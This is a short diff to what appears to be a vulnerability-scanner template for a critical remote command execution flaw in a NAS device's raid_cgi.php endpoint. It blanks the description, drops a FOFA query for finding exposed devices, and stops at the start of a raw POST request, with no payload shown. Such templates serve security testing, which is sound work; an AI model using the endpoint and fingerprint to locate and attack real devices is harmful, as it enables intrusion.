@@ -3,12 +3,8 @@ info:
   name: 西部数码 NAS raid_cgi.php 存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: rce,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: 'con_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"'
 http:
 - raw:
   - 'POST /web/storage/raid_cgi.php HTTP/1.1
